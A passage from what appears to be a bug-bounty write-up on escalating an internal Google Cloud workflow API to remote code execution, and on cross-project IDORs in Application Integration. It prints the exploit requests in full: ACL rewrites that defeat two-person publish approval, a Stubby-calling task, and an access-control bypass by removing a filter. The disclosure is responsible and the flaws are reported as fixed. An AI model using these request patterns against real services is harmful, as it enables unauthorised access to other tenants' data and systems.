+<p>So even with a stolen Stubby primitive, you don't actually get to call every RPC under the sun. You can only reach the ones whose <code>RpcSecurityPolicy</code> lets your peer identity through. Nevertheless, it is a massive increase in reachable attack surface.</p>
+<p>When I initially tried to create a workflow, I got the following <strong>INVALID_ARGUMENT</strong> error:</p>
+<p><strong>Request</strong></p>
+<pre><code><span>POST</span> <span>/v1/integrationPlatform:createDraftWorkflow</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span>Cookie</span><span>: </span>&lt;redacted&gt;
+<span>Authorization</span><span>: </span>SAPISIDHASH &lt;redacted&gt;
+<span>Origin</span><span>: </span>https://console.cloud.google.com
+<span>X-Goog-Api-Key</span><span>: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
+<span>Content-Type</span><span>: </span>application/json
+<span>Content-Length</span><span>: </span>197
+
+<span>{
+  <span>"workflow"</span>: {
+    <span>"name"</span>: <span>"my-new-workflow-test"</span>,
+    <span>"origin"</span>: <span>"UI"</span>,
+    <span>"triggerConfigs"</span>: [],
+    <span>"taskConfigs"</span>: []
+  },
+  <span>"isNewWorkflow"</span>: true
+}</span></code></pre><p><strong>Response</strong></p>
+<pre><code><span>{</span>
+  <span>"error"</span><span>:</span> <span>{</span>
+    <span>"code"</span><span>:</span> <span>400</span><span>,</span>
+    <span>"message"</span><span>:</span> <span>"Request contains an invalid argument."</span><span>,</span>
+    <span>"status"</span><span>:</span> <span>"INVALID_ARGUMENT"</span>
+  <span>}</span>
+<span>}</span></code></pre><blockquote>
+<p>Fun fact: If this request was sent from within Google's intranet, it would dump the full stack trace instead of just a generic error like this.</p>
+</blockquote>
+<p>I suspected that I was likely missing a required argument, possibly <strong>clientId</strong>. Remembering that the listQuotaQueue response from earlier had leaked <code>"client_id": "default"</code>, I tried setting that as the <code>clientId</code>, and it worked:</p>
+<p><strong>Request</strong></p>
+<pre><code><span>POST</span> <span>/v1/integrationPlatform:createDraftWorkflow</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span>Cookie</span><span>: </span>&lt;redacted&gt;
+<span>Authorization</span><span>: </span>SAPISIDHASH &lt;redacted&gt;
+<span>Origin</span><span>: </span>https://console.cloud.google.com
+<span>X-Goog-Api-Key</span><span>: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
+<span>Content-Type</span><span>: </span>application/json
+<span>Content-Length</span><span>: </span>197
+
+<span>{
+  <span>"workflow"</span>: {
+    <span>"name"</span>: <span>"my-new-workflow-test"</span>,
+    <span>"origin"</span>: <span>"UI"</span>,
+    <span>"clientId"</span>: <span>"default"</span>,
+    <span>"triggerConfigs"</span>: [],
+    <span>"taskConfigs"</span>: []
+  },
+  <span>"isNewWorkflow"</span>: true
+}</span></code></pre><p><strong>Response:</strong></p>
+<pre><code><span>{</span>
+  <span>"workflow"</span><span>:</span> <span>{</span>
+    <span>"workflowId"</span><span>:</span> <span>"53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e"</span><span>,</span>
+    <span>"name"</span><span>:</span> <span>"my-new-workflow-test"</span><span>,</span>
+    <span>"origin"</span><span>:</span> <span>"UI"</span><span>,</span>
+    <span>"creatorEmail"</span><span>:</span> <span>"admin@gvrptest.cry.dev"</span><span>,</span>
+    <span>"createdTime"</span><span>:</span> <span>"2025-12-01T04:19:14.449503Z"</span><span>,</span>
+    <span>"lastModifiedTime"</span><span>:</span> <span>"2025-12-01T04:19:14.449503Z"</span><span>,</span>
+    <span>"status"</span><span>:</span> <span>"DRAFT"</span><span>,</span>
+    <span>"snapshotNumber"</span><span>:</span> <span>"1"</span><span>,</span>
+    <span>"tags"</span><span>:</span> <span>[</span>
+      <span>"HEAD"</span>
+    <span>]</span><span>,</span>
+    <span>"lockedBy"</span><span>:</span> <span>"admin@gvrptest.cry.dev"</span><span>,</span>
+    <span>"lockedAtTime"</span><span>:</span> <span>"2025-12-01T04:19:14.449503Z"</span><span>,</span>
+    <span>"lastModifierEmail"</span><span>:</span> <span>"admin@gvrptest.cry.dev"</span><span>,</span>
+    <span>"clientId"</span><span>:</span> <span>"default"</span>
+  <span>}</span>
+<span>}</span></code></pre><p>However, it seemed in order to run a workflow, you had to publish it first, but that's where I got stuck:</p>
+<p><strong>Request</strong></p>
+<pre><code><span>POST</span> <span>/v1/integrationPlatform:publishWorkflow</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span>Cookie</span><span>: </span>&lt;redacted&gt;
+<span>Authorization</span><span>: </span>SAPISIDHASH &lt;redacted&gt;
+<span>Origin</span><span>: </span>https://console.cloud.google.com
+<span>X-Goog-Api-Key</span><span>: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
+<span>Content-Type</span><span>: </span>application/json
+
+<span>{
+  "workflowId": "53b2a49c-dd5e<span>-4</span>e45<span>-829</span>b<span>-61</span>a3b2e8ff6e"
+}</span></code></pre><p><strong>Response</strong></p>
+<pre><code><span>{</span>
+  <span>"error"</span><span>:</span> <span>{</span>
+    <span>"code"</span><span>:</span> <span>403</span><span>,</span>
+    <span>"message"</span><span>:</span> <span>"Publisher admin@gvrptest.cry.dev cannot be the same as the last editor admin@gvrptest.cry.dev of the integration my-new-workflow-test with snapshot number 1 and integration ID 53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e being edited from the UI. Please raise a Request to Publish and have your change approved by another person."</span><span>,</span>
+    <span>"status"</span><span>:</span> <span>"PERMISSION_DENIED"</span>
+  <span>}</span>
+<span>}</span></code></pre><p>I had to somehow add another user to the workflow, and use that to publish. At the time, I attempted to use the ACL endpoints to add another account, but wasn't able to get the permissions to work correctly.</p>
+<h3><a href="#the-dm-that-changed-everything" target="_blank" rel="noopener noreferrer">#</a>The DM that changed everything</h3><p>More than a month after I initially reported it, I was in a discord group chat with a few other researchers, where I jokingly mentioned that I had a bug to leak protobuf definitions within Google:</p>
+<p><img src="/assets/google-cloud-rce/discord_dm.jpg" alt="" /></p>
+<p>That's when <a href="https://bughunters.google.com/profile/57154734-5ce9-431a-b0c3-ca3ba28bb499" target="_blank" rel="noopener noreferrer">shrugged</a> mentioned that he had the same bug, and our conversation took off.</p>
+<p>It turned out that shrugged had also been investigating this very same API when he noticed these endpoints listed in the javascript files for <a href="https://cloud.google.com/application-integration" target="_blank" rel="noopener noreferrer">Application Integration</a> while researching another bug. He had spotted <code>GenericStubbyTypedTask</code> as a potential RCE vector, but was stuck without a valid <code>client_id</code> for the initial draft workflow creation.</p>
+<p>Meanwhile, I had the <code>client_id</code> from the quota queue leak, but was stuck at the publishing step. We quickly traded notes: I shared <code>client_id: "default"</code> and where I'd hit the wall, and we picked up from there.</p>
+<p>Google had already rolled out fixes from my initial report, so many of the original endpoints were now returning PERMISSION_DENIED. However, we noticed something interesting - many endpoints had 1:1 working counterparts under different service names:</p>
+<table>
+<thead>
+<tr>
+<th>Original (Blocked)</th>
+<th>Counterpart</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/v1/integrationPlatform:getProtoDefinition</td>
+<td>/v1/integrationPlatform/workflowsupport:getProtoDefinition</td>
+</tr>
+<tr>
+<td>/v1/integrationPlatform:runWorkflow</td>
+<td>/v1/integrationPlatform/workflowexecution:runWorkflow</td>
+</tr>
+<tr>
+<td>/v1/integrationPlatform:setAcl</td>
+<td>/v1/integrationPlatform/auth:setAcl</td>
+</tr>
+</tbody></table>
+<p>The initial fixes had only blocked the original "WorkflowEditorService" endpoints, but not these counterparts. The problem was <code>createDraftWorkflow</code> - we couldn't find a counterpart for it, and it was returning PERMISSION_DENIED:</p>
+<pre><code><span>{</span>
+  <span>"error"</span><span>:</span> <span>{</span>
+    <span>"code"</span><span>:</span> <span>403</span><span>,</span>
+    <span>"message"</span><span>:</span> <span>"The caller does not have permission"</span><span>,</span>
+    <span>"status"</span><span>:</span> <span>"PERMISSION_DENIED"</span>
+  <span>}</span>
+<span>}</span></code></pre><p>Strangely, when shrugged tried the same request, it worked on his first attempt, while I was consistently getting <code>PERMISSION_DENIED</code>. That's when it clicked: the fix hadn't fully propagated across all load balanced backends yet. By repeatedly sending the same request, we could reliably route through a backend that still allowed it through:</p>
+<pre><code><span>HTTP/2</span> <span>200</span> OK
+<span>Content-Type</span><span>: </span>application/json; charset=UTF-8
+
+<span>{ <span>"workflow"</span>: { <span>"workflowId"</span>: <span>"c6141c63-ac7a-4350-b582-7615ef045d0c"</span>, <span>"name"</span>: <span>"retest"</span>, <span>"origin"</span>: <span>"UI"</span>, <span>"creatorEmail"</span>: <span>"admin<span>@gvrptest</span>.cry.dev"</span>, <span>"createdTime"</span>: <span>"..."</span>, <span>"lastModifiedTime"</span>: <span>"..."</span>, <span>"status"</span>: <span>"DRAFT"</span>, <span>"snapshotNumber"</span>: <span>"1"</span>, <span>"tags"</span>: [ <span>"HEAD"</span> ], <span>"lockedBy"</span>: <span>"admin<span>@gvrptest</span>.cry.dev"</span>, <span>"lockedAtTime"</span>: <span>"..."</span>, <span>"lastModifierEmail"</span>: <span>"admin<span>@gvrptest</span>.cry.dev"</span>, <span>"clientId"</span>: <span>"default"</span> } }</span></code></pre><p>However, the task name GenericStubbyTypedTask didn't seem to exist. Looking at the response of <code>/v1/integrationPlatform:listTaskEntities</code> (decoded using the proto definitions from getProtoDefinition), it seemed to only provide tasks with <code>IO_TEMPLATE</code></p>
+<pre><code><span>{</span>
+  <span>"taskEntities"</span><span>:</span> <span>[</span>
+    <span>{</span>
+      <span>"metadata"</span><span>:</span> <span>{</span>
+        <span>"name"</span><span>:</span> <span>"Delete SFDC Record"</span><span>,</span>
+        <span>"descriptiveName"</span><span>:</span> <span>"Delete Salesforce Record"</span><span>,</span>
+        <span>"description"</span><span>:</span> <span>"Deletes a record in Salesforce"</span><span>,</span>
+        <span>"g3DocLink"</span><span>:</span> <span>"https://g3doc.corp.google.com/company/teams/cloudcrm/platform/user_guide/tasks/write_to_sfdc.md#delete-sfdc-record-task"</span><span>,</span>
+        <span>"iconLink"</span><span>:</span> <span>"https://gstatic.com/enterprise/crm/eventbus/images/icons/blue/salesforce_009EDB_48px_1_blue.svg"</span><span>,</span>
+        <span>"codeSearchLink"</span><span>:</span> <span>"https://cs.corp.google.com/piper///depot/google3/java/com/google/enterprise/crm/eventbus/connectors/generic/impl/GenericRestV2TaskImpl.java"</span><span>,</span>
+      ...
+      <span>}</span><span>,</span>
+      <span>"paramSpecs"</span><span>:</span> <span>{</span>
+        <span>"parameters"</span><span>:</span> <span>[</span>
+          <span>{</span>
+            <span>"key"</span><span>:</span> <span>"salesforceDomain"</span><span>,</span>
+            <span>"dataType"</span><span>:</span> <span>"STRING_VALUE"</span><span>,</span>
+            <span>"className"</span><span>:</span> <span>"java.lang.String"</span><span>,</span>
+            <span>"config"</span><span>:</span> <span>{</span>
+              <span>"descriptivePhrase"</span><span>:</span> <span>"Check in Salesforce: Setup &gt; Company Settings &gt; My Domain. If you don't have My Domain enabled, please use \"yourinstance.salesforce.com\" as the Salesforce domain."</span><span>,</span>
+              <span>"label"</span><span>:</span> <span>"Salesforce domain"</span><span>,</span>
+              <span>"uiPlaceholderText"</span><span>:</span> <span>"e.g. yourDomain.my.salesforce.com"</span>
+            <span>}</span><span>,</span>
+            <span>"required"</span><span>:</span> <span>1</span>
+          <span>}</span><span>,</span>
+        ...
+        <span>]</span>
+      <span>}</span><span>,</span>
+      ...
+      <span>"taskType"</span><span>:</span> <span>"IO_TEMPLATE"</span>
+    <span>}</span><span>,</span>
+    ...
+  <span>]</span>
+<span>}</span></code></pre><p>It seemed like the GenericStubbyTypedTask was likely part of the underlying <code>ASIS_TEMPLATE</code>:</p>
+<pre><code><span>{</span>
+  <span>"taskType"</span><span>:</span> <span>{</span>
+      <span>"description"</span><span>:</span> <span>"Defines the type of the task"</span><span>,</span>
+      <span>"enum"</span><span>:</span> <span>[</span>
+        <span>"TASK"</span><span>,</span>
+        <span>"ASIS_TEMPLATE"</span><span>,</span>
+        <span>"IO_TEMPLATE"</span>
+      <span>]</span><span>,</span>
+      <span>"enumDescriptions"</span><span>:</span> <span>[</span>
+        <span>"Normal IP task"</span><span>,</span>
+        <span>"Task is of As-Is Template type"</span><span>,</span>
+        <span>"Task is of I/O template type with a different underlying task"</span>
+      <span>]</span><span>,</span>
+      <span>"type"</span><span>:</span> <span>"string"</span>
+  <span>}</span>
+<span>}</span></code></pre><p>Interestingly, the underlying RPC for this endpoint is <code>google.internal.cloud.crm.ipfrontend.v1.WorkflowEditorService/ListTaskEntities</code>. This is eerily similar to the public <a href="https://cloud.google.com/application-integration" target="_blank" rel="noopener noreferrer">Application Integration</a> product's <code>/$rpc/google.cloud.integrations.v1alpha.Integrations/ListTaskEntities</code> though that too didn't return any <code>ASIS_TEMPLATE</code> tasks directly.</p>
+<p>Looking back at Application Integration's <a href="https://www.gstatic.com/_/pantheon-platform/_/js/k=pantheon-platform.r_ffqsputwh.en_US.gfcqeedabC0.O/ck=pantheon-platform.r_ffqsputwh.M74CJWSkfgQ.L.W.O/am=AAAAAAAAAQ/d=0/rs=ALa0V2PM3qwkJsQayfzRJaJ2GniB6mlGVw/m=sy1u,sy2o,sy65,sy1v,sy2m,sy2k,sy2n,sy2p,sy2q,sy2x,sy6l,sy6n,sy66,sy3x,sy6i,syo1,syo6,syo5,sy34,syj,syo,sy1z,sy2l,sybx,sy71,sy5m,syep,syes,sy6u,sy6m,sy6k,syi7,syo7,syo4,sy10,sy35,sy5b,sye2,sy2d,syt,sys,sydn,syg4,sy6z,syn,sy20,syg8,syjq,syjp,syjv,sy5h,sy86,sybo,syek,syeo,syeq,syen,syer,syet,syeu,syev,syew,syex,syey,sy4,sy68,sye3,synv,syof,syoe,syor,syox,syov,sy31,sy4l,sy8b,sy6w,sy8f,syb9,sya,sy95,syc3,syds,sypc,syph,sy6o,sy6p,sy8d,sy8e,sy4r,syo3,sy1m,syei,syjh,syp6,sy3g,sy2r,sy11,sy2b,sy33,syb3,syd4,sy5c,sy5d,sy2i,sye9,sy2e,sy2f,sy2g,sy2h,sy1p,syv,sy4w,syr,sy58,sy59,sydm,sydo,sydp,sydq,sygh,sygk,sy8m,syjr,syk7,syhd,syem,sylk,syod,syog,syok,syop,syos,syot,syoz,syp0,syow,syoy,syhc,sy54,synz,sy3b,sy4k,sy4p,sy8g,synp,sypb,syct,sy5n,syhy,sypg,sy6q,sy8c,sydj,syb7,syc8,syoc,syp5,syp8,sye,sy26,sy87,sya4,syo2,syoi,syon,syp9,sy1y,sy2j,sy44,sy6e,sy99,sy9c,syb8,syc1,sye7,sye8,syed,syoj,sypd,sy2c,sy1w,sy1q,syw,sy19,sy1s,sy48,sy4b,sy4x,sy8i,sybr,syck,sydl,sye6,syfm,syfv,sygj,sygl,sygp,syhe,syj8,syjs,sykz,syl1,syl2,synb,synn,syoq,sypv,sypw,syq5,syqa,sy1r,sy4s,sy6s,sy8o,syaj,syha,synq,sypm,sypn,sycu,syp1,sy5o,sypi,cc5GEc,sy6r,sy6t,sy8h,sy9l,sya2,syaa,syb2,sybb,sybd,sybf,sybh,sybj,sybk,syc0,syc9,sycd,sydf,syg5,synx,NTA1Nc,syoa,syoo,syou,syp4,SUXzGf,a1YRQd,syp7,n5B0Gd,sypf,sypz,syq7,syq6,syq3,syqb,syq8,syq4,syii,sy6c,sy93,sy9s,syah,syam,sybp,syc4,syc5,syob,syol,syp2,sypk,syq1,syq2,syq9,CiTGSe" target="_blank" rel="noopener noreferrer">JS code</a> from <a href="https://console.cloud.google.com/" target="_blank" rel="noopener noreferrer">Cloud Console</a>:</p>
+<p><img src="/assets/google-cloud-rce/integrations_js.jpg" alt="" /></p>
+<pre><code>[<span>"Vertex AI - Predict"</span>,<span>"https://www.gstatic.com/enterprise/crm/eventbus/images/icons/custom_tasks/document_ai.png"</span>],
+[<span>"GenericStubbyTypedTaskV2"</span>,<span>"http://gstatic.com/enterprise/crm/eventbus/images/icons/blue/stubby_48px_blue.svg"</span>],
+[<span>"RunGoogleSqlPlxQueryTask"</span>,<span>"https://fonts.gstatic.com/s/i/productlogos/plx/v6/192px.svg"</span>],
+[<span>"ConvertDremelResultToJsonTask"</span>,<span>"https://www.gstatic.com/images/icons/material/system/2x/settings_googblue_24dp.png"</span>],</code></pre><p>The exact task name was <strong>GenericStubbyTypedTaskV2</strong>, complete with its own icon, no less: <img src="/assets/google-cloud-rce/stubby_48px_blue.svg" alt="" /></p>
+<p>Attempting to configure <code>GenericStubbyTypedTask</code> on <a href="https://cloud.google.com/application-integration" target="_blank" rel="noopener noreferrer">Application Integration</a> returned an error revealing the required fields:</p>
+<pre><code><span>{</span>
+  <span>"error"</span><span>:</span> <span>{</span>
+    <span>"code"</span><span>:</span> <span>400</span><span>,</span>
+    <span>"message"</span><span>:</span> <span>"'Required input key serverSpec not present in task GenericStubbyTypedTaskImpl, task number 1.'"</span><span>,</span>
+    <span>"status"</span><span>:</span> <span>"INVALID_ARGUMENT"</span>
+  <span>}</span>
+<span>}</span></code></pre><p>Repeating with each missing key revealed <strong>serverSpec</strong>, <strong>serviceName</strong>, and <strong>serviceMethod</strong>. These same parameters applied to <code>GenericStubbyTypedTaskV2</code>. Using <a href="https://www.ezequiel.tech/" target="_blank" rel="noopener noreferrer">Ezequiel Pereira</a>'s <a href="https://github.com/ezequielpereira/GAE-RCE/blob/c58ccd52d9204a0e5b8c7cf9b82b8e6e06d524a8/protos/net/rpc/serverstatus.proto#L155" target="_blank" rel="noopener noreferrer">protobuf repo</a> as reference and a GSLB address we found leaked in another discovery document, we configured the task to call <code>/ServerStatus.GetServices</code> on <strong>gslb:alkali-base</strong>:</p>
+<blockquote>
+<p>Fun fact: Alkali is Google's internal framework that Googlers can use to spin up production APIs with minimal boilerplate, they tend to have a lot of security issues.</p>
+</blockquote>
+<pre><code><span>HTTP/2</span> <span>200</span> OK
+<span>Content-Type</span><span>: </span>application/json; charset=UTF-8
+
+<span>{<span>"workflow"</span>: {<span>"workflowId"</span>: <span>"f91833bf-eacb-43ac-8490-099fef977e19"</span>, <span>"name"</span>: <span>"retest-test123"</span>, <span>"taskConfigs"</span>: [{<span>"taskName"</span>: <span>"GenericStubbyTypedTaskV2"</span>, <span>"taskNumber"</span>: <span>"1"</span>, <span>"parameters"</span>: {<span>"response"</span>: {<span>"key"</span>: <span>"response"</span>, <span>"value"</span>: {<span>"stringValue"</span>: <span>"$response$"</span>}, <span>"dataType"</span>: <span>"STRING_VALUE"</span>}, <span>"serverSpec"</span>: {<span>"key"</span>: <span>"serverSpec"</span>, <span>"value"</span>: {<span>"stringValue"</span>: <span>"gslb:alkali-base"</span>}, <span>"dataType"</span>: <span>"STRING_VALUE"</span>}, <span>"serviceName"</span>: {<span>"key"</span>: <span>"serviceName"</span>, <span>"value"</span>: {<span>"stringValue"</span>: <span>"ServerStatus"</span>}, <span>"dataType"</span>: <span>"STRING_VALUE"</span>}, <span>"serviceMethod"</span>: {<span>"key"</span>: <span>"serviceMethod"</span>, <span>"value"</span>: {<span>"stringValue"</span>: <span>"GetServices"</span>}, <span>"dataType"</span>: <span>"STRING_VALUE"</span>}}, <span>"position"</span>: {<span>"x"</span>: <span>-716</span>, <span>"y"</span>: <span>-445</span>}, <span>"label"</span>: <span>"Stubby Internal"</span>, <span>"incomingEdgeCount"</span>: <span>1</span>, <span>"taskType"</span>: <span>"ASIS_TEMPLATE"</span>, <span>"externalTaskType"</span>: <span>"NORMAL_TASK"</span>}], <span>"triggerConfigs"</span>: [{<span>"startTasks"</span>: [{<span>"taskNumber"</span>: <span>"1"</span>}], <span>"properties"</span>: {<span>"Trigger name"</span>: <span>"my-api-trigger-123"</span>}, <span>"triggerType"</span>: <span>"API"</span>, <span>"triggerNumber"</span>: <span>"1"</span>, <span>"enabledClients"</span>: [<span>"default"</span>], <span>"triggerId"</span>: <span>"api_trigger/my-api-trigger-123"</span>}], <span>"origin"</span>: <span>"UI"</span>, <span>"creatorEmail"</span>: <span>"&lt;REDACTED&gt;"</span>, <span>"createdTime"</span>: <span>"2026-01-12T09:45:55.896951Z"</span>, <span>"lastModifiedTime"</span>: <span>"2026-01-12T09:45:55.896951Z"</span>, <span>"status"</span>: <span>"DRAFT"</span>, <span>"snapshotNumber"</span>: <span>"1"</span>, <span>"tags"</span>: [<span>"HEAD"</span>], <span>"lockedBy"</span>: <span>"&lt;REDACTED&gt;"</span>, <span>"lockedAtTime"</span>: <span>"2026-01-12T09:45:55.896951Z"</span>, <span>"lastModifierEmail"</span>: <span>"&lt;REDACTED&gt;"</span>, <span>"clientId"</span>: <span>"default"</span>}}</span></code></pre><p>Everything here is strikingly similar to <a href="https://cloud.google.com/application-integration" target="_blank" rel="noopener noreferrer">Application Integration</a> - the workflow structure, the task configuration, even the publishing and running flow. Notice the <code>"position": {"x": -716, "y": -445}</code> in our workflow? The internal UI likely looks very similar to Application Integration's visual workflow editor, where we're essentially setting coordinates for task positions:</p>
+<p><img src="/assets/google-cloud-rce/integrations_editor_layout.jpg" alt="" /></p>
+<p>Remember the ACL issue that blocked me from publishing earlier? shrugged figured out we could bypass it by updating the ACL for <code>IP_EVENTBUS_WORKFLOWS</code> with the obfuscated Gaia ID of two attacker controlled Google accounts.</p>
+<p><strong>Request</strong></p>
+<pre><code><span>POST</span> <span>/v1/integrationPlatform/auth:setAcl</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span>Cookie</span><span>: </span>&lt;redacted&gt;
+<span>Authorization</span><span>: </span>&lt;redacted&gt;
+<span>Origin</span><span>: </span>https://console.cloud.google.com
+<span>X-Goog-Api-Key</span><span>: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
+<span>Content-Type</span><span>: </span>application/json
+<span>Content-Length</span><span>: </span>500
+
+<span>{<span>"resourceInfo"</span>: {<span>"resource"</span>: <span>"IP_EVENTBUS_WORKFLOWS"</span>, <span>"id"</span>: <span>"retest-test123"</span>}, <span>"acl"</span>: {<span>"entries"</span>: [{<span>"scope"</span>: {<span>"obfuscatedGaiaId"</span>: <span>"100029910836469267942"</span>}, <span>"role"</span>: <span>105</span>}, {<span>"scope"</span>: {<span>"obfuscatedGaiaId"</span>: <span>"113728935872649341310"</span>}, <span>"role"</span>: <span>105</span>}]}}</span></code></pre><p><strong>Response</strong></p>
+<pre><code><span>HTTP/2</span> <span>200</span> OK
+<span>Content-Type</span><span>: </span>application/json; charset=UTF-8
+
+<span><span>{}</span></span></code></pre><p>First, we toggled the request to publish workflow using the first attacker Google account:</p>
+<pre><code><span>POST</span> <span>/v1/integrationPlatform/workflowdeployment:toggleRequestToPublishWorkflow</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>cloudcrmipfrontend-pa.clients6.google.com
+...
+
+<span>{"workflowId": "f91833bf-eacb<span>-43</span>ac<span>-8490</span><span>-099</span>fef977e19"}</span></code></pre><p>And then finally publishing the workflow using the second attacker account:</p>
+<pre><code><span>POST</span> <span>/v1/integrationPlatform/workflowdeployment:publishWorkflow</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>cloudcrmipfrontend-pa.clients6.google.com
+...
+
+<span>{"workflowId": "f91833bf-eacb<span>-43</span>ac<span>-8490</span><span>-099</span>fef977e19"}</span></code></pre><p>Running a workflow configured with <code>GenericStubbyTypedTaskV2</code> with <code>serverSpec</code> set to <code>gslb:alkali-base</code> and service/method set to <code>/ServerStatus.GetServices</code>, we were able to <strong>execute the Stubby query</strong>:</p>
+<pre><code>...
+<span>{</span>
+    <span>"protoValue"</span><span>:</span> <span>{</span>
+    <span>"@type"</span><span>:</span> <span>"type.googleapis.com/rpc.ServiceList"</span><span>,</span>
+    <span>"service"</span><span>:</span> <span>[</span>
+        <span>{</span>
+        <span>"name"</span><span>:</span> <span>"AlkaliBaseAccountService"</span><span>,</span>
+        <span>"descriptor"</span><span>:</span> <span>{</span>
+            <span>"filename"</span><span>:</span> <span>"google/internal/alkali/base/v1/alkali_base_account_service.proto"</span><span>,</span>
+            <span>"name"</span><span>:</span> <span>"AlkaliBaseAccountService"</span><span>,</span>
+            <span>"method"</span><span>:</span> <span>[</span>
+            <span>{</span>
+                <span>"name"</span><span>:</span> <span>"ListAccounts"</span><span>,</span>
+                <span>"argumentType"</span><span>:</span> <span>"google.internal.alkali.base.v1.ListAccountsRequest"</span><span>,</span>
+                <span>"resultType"</span><span>:</span> <span>"google.internal.alkali.base.v1.ListAccountsResponse"</span><span>,</span>
+                <span>"deadline"</span><span>:</span> <span>30</span><span>,</span>
+                <span>"securityLevel"</span><span>:</span> <span>"none"</span>
+            <span>}</span><span>,</span>
+            <span>{</span>
+                <span>"name"</span><span>:</span> <span>"ListAccessibleAccounts"</span><span>,</span>
+                <span>"argumentType"</span><span>:</span> <span>"google.internal.alkali.base.v1.ListAccessibleAccountsRequest"</span><span>,</span>
+                <span>"resultType"</span><span>:</span> <span>"google.internal.alkali.base.v1.ListAccountsResponse"</span><span>,</span>
+                <span>"deadline"</span><span>:</span> <span>30</span><span>,</span>
+                <span>"securityLevel"</span><span>:</span> <span>"none"</span>
+            <span>}</span><span>,</span>
+            ...</code></pre><p>We then updated the initial bug with the escalation to RCE. Neither of us could have done this alone, and the timing was clutch: just one hour after our PoC, the fix for <code>createDraftWorkflow</code> fully propagated. Any later and this RCE escalation would've stayed theoretical. That being said, we were cut off by Google before we could actually execute code on Google's servers.</p>
+<h3><a href="#timeline-1st-rce" target="_blank" rel="noopener noreferrer">#</a>Timeline (1st RCE)</h3><ul>
+<li>2025-12-01 - Initial report sent to Google</li>
+<li>2025-12-01 - Google triaged report as P0/S0</li>
+<li>2025-12-01 - 🎉 <strong>Nice catch!</strong></li>
+<li>2026-01-12 - Informed Google's security team about the RCE escalation</li>
+<li>2026-01-12 - Updated report with RCE PoC</li>
+<li>2026-01-12 - Report escalated by Google</li>
+<li>2026-01-16 - <strong>Panel awards $60,000</strong>. Rationale for this decision: This report was of exceptional quality! Vulnerability category is "Compromise of Google Cloud Production Environment". Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products.</li>
+</ul>
+<h3><a href="#round-2-3-months-later" target="_blank" rel="noopener noreferrer">#</a>Round 2 (3 months later)</h3><p>You thought that was the end of it, not so easy. Three months later, my fuzzer pinged me about some IDORs in the public Application Integration product's <a href="https://docs.cloud.google.com/application-integration/docs/reference/rest" target="_blank" rel="noopener noreferrer">public API</a>.</p>
+<p>Turns out, throughout this whole API, you could reference your own project ID in the URL, but reference someone else's UUID:</p>
+<pre><code><span>GET</span> <span>/v1/projects/&lt;your-project&gt;/locations/us-central1/integrations/anythinghere/versions/&lt;victim-uuid&gt;</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>integrations.googleapis.com
+<span>Authorization</span><span>: </span>Bearer &lt;redacted&gt;</code></pre><p>and the API would happily return the victim's resource, because the authentication check was done on your project ID (you are authorized for your own project), but there was no access control check if the ID was actually tied to your project or not.</p>
+<p>However, this by itself wouldn't be too impactful, because these are UUIDv4. The search space is far too large to be meaningfully bruteforce-able (search space of 10^36). Hence, I went looking around for any way I could potentially leak a victim's resource UUIDs.</p>
+<p>That's when I noticed this interesting "test cases" feature. From the <a href="https://docs.cloud.google.com/application-integration/docs/test-cases" target="_blank" rel="noopener noreferrer">documentation</a>:</p>
+<blockquote>
+<p>With Application Integration, you can create and run multiple test cases on your complex integrations that connect and manage Google Cloud services and other business applications. By testing your integration flow, you can ensure that your integration is working as intended.</p>
+</blockquote>
+<p>The interesting thing was, when you look at how your test cases are loaded in the frontend, the browser sends a request like so:</p>
+<pre><code><span>POST</span> <span>/$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>us-central1-integrations.clients6.google.com
+<span>Content-Type</span><span>: </span>application/x-protobuf
+
+<span><span>&lt; RAW PROTOBUF DATA &gt;</span></span></code></pre><p>The actual request payload is in protobuf, I've decoded here so you can see how it looks like:</p>
+<pre><code><span>{</span>
+  <span>"1"</span><span>:</span> <span>"projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4"</span><span>,</span>
+  <span>"2"</span><span>:</span> <span>"workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4"</span><span>,</span>
+  <span>"6"</span><span>:</span> <span>{</span>
+    <span>"1"</span><span>:</span> <span>[</span><span>"name"</span><span>,</span> <span>"display_name"</span><span>,</span> <span>"update_time"</span><span>,</span> <span>"client_id"</span><span>]</span>
+  <span>}</span>
+<span>}</span></code></pre><p>Field <code>1</code> is the parent resource (my project, my version UUID), field <code>6</code> is the response field mask, and field <code>2</code>, <code>workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4</code> seemed to be some sort of filter. Perhaps if this was omitted, it would return test cases for all workflows? Surely not...</p>
+<p>Dropping field <code>2</code> and <code>6</code> from the request:</p>
+<pre><code><span>{</span>
+  <span>"1"</span><span>:</span> <span>"projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4"</span>
+<span>}</span></code></pre><p>...the response came back with test cases from every other GCP project:</p>
+<pre><code><span>{</span>
+  <span>"testCases"</span><span>:</span> <span>[</span>
+    <span>{</span>
+      <span>"name"</span><span>:</span> <span>"projects/331540621401/locations/us-central1/integrations/my-draft-integration/versions/631a0566-02fc-4dce-b319-25e2c68168f4/testCases/b25fb963-792c-419d-a98b-eb930b2a29e3"</span><span>,</span>
+      <span>"displayName"</span><span>:</span> <span>"test"</span><span>,</span>
